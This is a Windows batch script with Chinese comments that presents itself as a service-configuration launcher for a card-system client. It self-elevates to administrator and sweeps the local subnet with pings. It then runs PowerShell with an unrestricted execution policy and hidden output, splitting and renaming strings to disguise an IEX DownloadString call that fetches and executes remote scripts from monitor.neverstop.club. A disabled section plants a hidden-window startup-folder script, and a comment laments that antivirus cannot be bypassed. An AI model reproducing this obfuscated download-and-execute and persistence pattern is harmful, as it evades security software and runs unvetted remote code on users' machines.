@echo off
rem 获取管理员权限
(cd /d "%~dp0")&&(NET FILE||(powershell start-process -FilePath '%0' -verb runas)&&(exit /B)) >NUL 2>&1

cls
echo.
echo.          ###########################################################
echo.          ##                                                       ##
echo.          ##    正在配置服务，请稍等...                            ##
echo.          ##    请勿操作电脑，五分钟后仍未打开系统请联系运维       ##
echo.          ##    稍安勿躁，祝您生活愉快！！！                       ##
echo.          ##   ------------------------------------------------    ##
echo.          ##    使用桌面生成的 "点我打开一卡通" 打开系统更快捷     ##
echo.          ##    若 "点我打开一卡通" 无法使用，请用本程序更新       ##
echo.          ##                                                       ##
echo.          ###########################################################

@echo off
goto ARP
rem 这个功能很好，奈何杀软拦截，真的是一点办法都没有，绕不过呀，需要操作，暂时不启用
rem 检测是否存在APR脚本，不存在则添加
set ARP="%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat"
if exist %ARP% (
    goto MySQL
	) else (
	echo if "%%1"=="hide" goto CmdBegin >%ARP%
    echo start mshta vbscript:createobject("wscript.shell"^).run("""%%~0"" hide",0^)(window.close^)^&^&^exit >>%ARP%
    echo :CmdBegin >>%ARP%
    echo ———————————————— >>%ARP%
	echo @echo off >>%ARP%
	echo for /f "tokens=2 delims=:" %%%%i in ('ipconfig^^^|findstr /c:"IPv4"'^) do (for /f "tokens=1,2,3,4 delims=." %%%%a in ('echo %%%%i'^) do set Three=%%%%c^) ^>nul >>%ARP%
    echo for /L %%%%i in (1,1,254^) do ping -w 2 -n 1 192.168.%%Three%%.%%%%i ^>nul >>%ARP%
	goto ARP
)

:ARP
rem 获取本地ip地址段，然后刷新arp表
echo.          ===========================================================
echo.
echo                  正在刷新ARP缓存，需要约120秒，请稍等...
echo.
echo.          ===========================================================
for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c)
for /L %%i in (1,1,254) do ping -w 2 -n 1 192.168.%Three%.%%i >nul
goto MySQL

:MySQL
rem 查询MySQL服务是否启动，判断是否为主机
set M_Status=1 
(tasklist|findstr "mysql"||set M_Status=0) >nul 2>&1
if %M_Status% equ 0 (
    echo.          ===========================================================
    echo.
    echo                  未检测到 MySQL 服务，正在连接主机系统，请稍等...
    echo.
    echo.          ===========================================================
    goto IESettings
) else (
    echo.          ===========================================================
    echo.
    echo                  检测到 MySQL 服务，正在检测Jboss服务，请稍等...
    echo.
    echo.          ===========================================================
    goto Jboss
)

:Jboss
rem 查询系统是否存在jboss服务，判断是否为主机,因为比斯特数据库进程名称也是mysql，容易造成误判
SC QUERY jboss >NUL 2>&1
if errorlevel 1060 (
    echo.          ===========================================================
    echo.
    echo                  未检测到 Jboss 服务，正在连接主机系统，请稍等...
    echo.
    echo.          ===========================================================
    goto IESettings
) else (
    echo.          ===========================================================
    echo.
    echo                  检测到 Jboss 服务，正在启动系统，请稍等...
    echo.
    echo.          ===========================================================
    net start jboss >nul 2>&1
    net start "Inspur lcgxsjjh" >nul 2>&1
    goto PrimaryIESettings
)

:PrimaryIESettings
rem 调用主机powershell脚本，添加可信站点，兼容性视图
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)" >nul 2>&1
goto bye

:IESettings
rem 调用副机powershell脚本，添加可信站点，兼容性视图
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)" >nul 2>&1
goto bye

:bye
echo.          ===========================================================
echo.
echo                  程序配置完成，正在调用IE浏览器，请稍等...
echo.
echo.          ===========================================================
@ping 127.0.0.1 -n 8 >nul
exit